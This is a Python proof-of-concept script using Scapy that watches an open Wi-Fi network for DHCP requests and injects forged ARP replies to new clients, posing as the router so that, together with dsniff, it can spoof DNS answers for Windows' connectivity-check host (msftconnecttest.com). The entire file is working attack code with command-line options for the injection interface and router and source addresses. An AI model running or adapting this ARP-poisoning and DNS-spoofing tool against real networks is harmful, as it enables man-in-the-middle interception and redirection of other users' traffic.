#!/usr/bin/python3

import argparse
import sys
from easyThread import Backgrounder
from scapy.all import *

class Shared(object):
    """We share this obj amongst all panes"""
    def __init__(self, args):
        self.args = args
        self.dTracker = {}
        self.rMac = args.rtrmac
        self.rIP = args.rtrip
        self.iFace = args.i
        self.sMac = args.srcmac

class Glass(object):
    """Singular pane of glass"""

    def __init__(self, shared):
        self.sh = shared


    def shard(self):
        """
        Here we form the arp storm and proceed to respond as DNS because GW is
        most likely to be the DNS.

        For sixty seconds we arp storm while the non scapy portion of this
        method relies on dsniff as it will provide a local resolution for
        www.msftconnecttest.com and nothing else.
        """
        def outbound(packet):

            ## Obtain target IP address
            pdst = packet[DHCP].options[2][1]

            # Craft and send
            arp = RadioTap()\
                  /Dot11(
                        FCfield = 1,
                        addr1 = self.sh.rMac,
                        addr2 = self.sh.sMac,
                        addr3 = packet[Dot11].addr2,
                        subtype = 8,
                        type = 2
                        )\
                  /Dot11QoS()\
                  /LLC()\
                  /SNAP()\
                  /ARP(op = 2,
                       hwsrc = self.sh.sMac,
                       hwdst = packet[Dot11].addr2,
                       pdst = pdst,
                       psrc = self.sh.rIP
                       )
            sendp(arp, iface = self.sh.args.i, count = 60, inter = .2)
        return outbound


    def tripWire(self):
        def snarf(packet):
            if packet.haslayer('DHCP'):
                if packet[DHCP].options[0][1] == 3:
                    print(packet.summary())
                    return True
        return snarf


    def trigger(self):
        tension = self.tripWire()
        shd = self.shard()
        p = sniff(iface = self.sh.iFace, prn = shd, lfilter = tension)


def main(args):
    ## Create a share
    sh = Shared(args)

    ## Break a pane for DHCP sniffing
    wp = Glass(sh)

    ## Track the broken glass
    sh.dTracker.update({'DHCP': wp})

    ## Background this pane and monitor via prn
    Backgrounder.theThread = wp.trigger()

    bg = Backgrounder()
    bg.easyLaunch()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'ncsi weakness on 802.11 Open network - proof of concept')
    parser.add_argument('-i',
                        help = 'injection NIC',
                        required = True)
    parser.add_argument('--rtrip',
                        help = 'router ip',
                        required = True)
    parser.add_argument('--rtrmac',
                        help = 'router mac',
                        required = True)
    parser.add_argument('--srcmac',
                        help = 'source mac',
                        required = True)
    args = parser.parse_args()
    main(args)
